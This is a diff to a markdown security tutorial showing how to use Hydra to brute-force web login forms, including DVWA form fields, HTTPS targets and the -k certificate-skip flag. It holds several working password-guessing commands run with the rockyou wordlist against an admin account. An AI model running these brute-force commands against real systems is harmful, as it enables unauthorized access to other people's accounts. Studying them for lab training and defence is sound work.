@@ -128,6 +128,32 @@ Breakdown:
 
 > `^USER^` and `^PASS^` are Hydra placeholders — replaced with actual values during attack.
 
+### ⚠️ Important — Include ALL Form Fields
+
+When a browser submits a form, it sends **every field** — including hidden fields and submit button values. If Hydra is missing any field, the server may reject the request as invalid and Hydra will appear to fail even with correct credentials.
+
+**Example — DVWA login has 3 fields:**
+
+```
+username=^USER^
+password=^PASS^
+Login=Login       ← submit button — must include this
+```
+
+Wrong (missing submit button → won't work):
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.105 http-post-form \
+"/login.php:username=^USER^&password=^PASS^:Login failed"
+```
+
+Correct (all fields included):
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.105 http-post-form \
+"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+```
+
+> **Rule:** Always intercept the actual login request with Burp Suite first. Copy the exact POST body — include every field exactly as the browser sends it.
+
 ---
 
 ### HTTP Basic Auth
@@ -135,6 +161,37 @@ Breakdown:
 ```bash
 hydra -l admin -P rockyou.txt 192.168.1.105 http-get /admin
 ```
+
+---
+
+### HTTPS Login Form
+
+For HTTPS targets, replace `http-post-form` with `https-post-form`:
+
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.105 https-post-form \
+"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+```
+
+> Only `http` → `https` changes — everything else stays the same.
+
+### ⚠️ SSL Certificate Issue with Hydra
+
+Hydra may fail on HTTPS targets due to SSL certificate verification errors. This commonly happens with:
+- Self-signed certificates (local labs)
+- Expired certificates
+- Internal/private CA certificates
+
+Fix — use `-k` flag to skip certificate verification:
+
+```bash
+hydra -l admin -P rockyou.txt 192.168.1.105 https-post-form \
+"/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -k
+```
+
+> `-k` tells Hydra to ignore SSL certificate errors and proceed anyway. Only use this in lab environments — never on production systems.
+
+**Note:** Most local practice labs (DVWA, bWAPP) run on HTTP — HTTPS is mainly relevant for real-world targets.
 
 ---
 
